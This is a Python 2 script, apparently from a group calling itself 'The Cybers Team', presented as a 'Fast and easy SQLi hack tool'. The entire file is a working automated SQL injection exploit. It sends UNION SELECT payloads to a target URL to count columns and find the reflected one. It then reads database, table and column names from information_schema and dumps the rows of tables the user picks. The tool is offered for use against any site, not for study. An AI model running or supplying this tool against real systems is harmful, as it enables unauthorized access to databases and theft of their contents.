# Facebook: https://www.facebook.com/TheCybersTeam
# Group:    https://www.facebook.com/groups/TheCybersTeam
# Channel:  https://www.youtube.com/channel/UCKFMv1cifW55lKKps2thhbw

import urllib as cybers
import sys
import os
import platform

debug = 0

clear = "clear"
if platform.system() == "Windows":
    clear = "cls"
os.system(str(clear))

"""
_____ _              ___      _                     _____                    
/__   \ |__   ___    / __\   _| |__   ___ _ __ ___  /__   \___  __ _ _ __ ___  
  / /\/ '_ \ / _ \  / / | | | | '_ \ / _ \ '__/ __|   / /\/ _ \/ _` | '_ ` _ \ 
 / /  | | | |  __/ / /__| |_| | |_) |  __/ |  \__ \  / / |  __/ (_| | | | | | |
 \/   |_| |_|\___| \____/\__, |_.__/ \___|_|  |___/  \/   \___|\__,_|_| |_| |_|
                         |___/                                                 Beta 2.0
More: https://www.facebook.com/TheCybersTeam"
Fast and easy SQLi hack tool"
"""

class Sqli:
    url = None
    vulCol = None
    columns = None
    dbs = []
    build = ["", ""]
    key = "0x5468334379623372735433346d"
    def setUrl(self):
        for k, v in enumerate(sys.argv):
            if v == "--url":
                try:
                    u = sys.argv[k+1]
                    if debug == 1:
                        u = "http://testphp.vulnweb.com/listproducts.php?cat=1"
                    pos = u.find("=")
                    url = u[:pos+1]
                    self.url = url
                except:
                    pass              
        try:
            print "Url: "+u
            print "\n"
        except NameError:
            pass
            print "*ERROR*: Url not defined!\n"
            print "Usage: python sqli.py --url http://testphp.vulnweb.com/listproducts.php?cat=1\n"
            exit()

    def getContent(self,url):
        res = cybers.urlopen(url)
        return res.read() 

    def setColumns(self):
        print "Start Count Columns..."
        url = self.url + "0x2d31+union+select+"
        start = 1
        finish = 50
        for i in range(start,finish):
            sys.stdout.write("\rColumns Total: {0}".format(i))
            if i != start and i != finish:
                url+=", "
            url+=self.key
            res = self.getContent(url)
            if res.find("union select") ==-1:
                if res.find("Th3Cyb3rsT34m") !=-1:
                    self.columns = i
                    return    
        self.columns = 0

    def setVulCol(self):
        for i in range(1, self.columns+1):
            line = "0x2d31+union+select+"
            for j in range(1, self.columns+1):
                if j != 1 and j != self.columns+1:
                    line = line + ", "
                if i == j:
                    line+="'"+self.key+"'"
                else:
                    line+="'"+str(j)+"'"
            res = self.getContent(self.url + line)
            if res.find(self.key) !=-1:
                self.vulCol = i
                return
        self.vulCol = 0

    def getConcat(self,string):
        return "concat(0x27,0x23,group_concat(unhex(hex("+string+"))),0x23,0x27)"

    def getVars(self,content):
        pos = content.find("'#")
        if(pos != -1):      
            ini = content[pos+2:]
            pos = ini.find("#'")
            if(pos !=-1):
                return ini[:pos]
            else:
                print "*ERROR*: Not found!\n"
                exit()

    def getDatabase(self):
        self.build = [self.url + "0x2d31+union+select+", ""]
        line = ""
        side = 0
        for i in range(1, self.columns+1):
            if i != 1 and i != self.columns+1:
                line=","
            if side == 0:
                if i != self.vulCol:
                    self.build[side]+=line+str(i)
                    line+= str(i) 
                else:
                    if i !=1:
                        self.build[side]+=","
                    side = 1
            else:
                self.build[side]+=line+str(i)


        url = self.build[0]+self.getConcat("database()")+self.build[1]
        res = self.getContent(url)
        return self.getVars(res)

    def getTables(self,database):

        url = self.build[0]+self.getConcat("table_name")+self.build[1]+"+from+information_schema.tables+where+table_schema='"+database+"'"
        res = self.getContent(url)
        return self.getVars(res)

    def getColumns(self,table,database):
        url = self.build[0]+self.getConcat("column_name")+self.build[1]+"+from+information_schema.columns+where+table_name='"+table+"'"
        res = self.getContent(url)
        return self.getVars(res)

    def getData(self,cols,table,database):
        line = ""
        i = 0
        title = ""
        space = []
        for name in cols:
            space.append(len(name))
            title+=name+"\t"
            if i !=0:
                line+=",0x3a,"
            line+=name
            i+=1
        url = self.build[0]+"concat(0x27,0x23,group_concat("+line+"),0x23,0x27)"+self.build[1]+"+from+"+table
        res = self.getContent(url)
        data = self.getVars(res)
        try:
            rows = data.split(",")
        except:
            print "*ERROR*: Not found!\n"
        vector = []
        for j in rows:
            i=0
            col = j.split(":")
            temp = []
            for k in col:
                temp.append(k)
                if len(k)>space[i]:
                    space[i]=len(k)
                i=i+1
            vector.append(temp)
        self.dbs[0].tables[0].setDatas(vector)
        line=""
        i=0
        for j in cols:
            line+=j
            for k in range(len(j),space[i]+2):
                line+=" "
        print line
        for j in rows:
            i = 0
            col = j.split(":")
            line=""
            i=0
            for k in col:
                line+=k
                for l in range(len(k),space[i]+2):
                    line +=" "
                i=i+1
            print line

class Db:
    name = None
    tables = []
    def setName(self, name):
        self.name = name
    def setTables(self, table):
        self.tables = table
        
class Tb:
    name = None
    columns = []
    rows = []
    def setName(self,name):
        self.name = name
    def setColumns(self,columns):
        self.columns = columns
    def setDatas(self,rows):
        self.rows = rows

s = Sqli()
s.setUrl()

s.setColumns()
s.setVulCol()
print "\nVul Column: " +str(s.vulCol)

db = Db()
database = s.getDatabase()
db.setName(database)
s.dbs.append(db)

for i in s.dbs:
    print "Database: " + i.name

tbs = []
tables = s.getTables(s.dbs[0].name)
for i in tables.split(","):
    tb = Tb()
    tb.setName(i)
    tbs.append(tb)

s.dbs[0].setTables(tbs)
print "Tables: "+tables

sys.stdout.write("\nTable: ")
table = raw_input()
cols = s.getColumns(table,s.dbs[0].name)
cls = cols.split(",")
s.dbs[0].tables[0].setColumns(cls)
print "Columns: "+cols

sys.stdout.write("\nColumns names: ")
cols = raw_input().split(",")
s.getData(cols,table,database)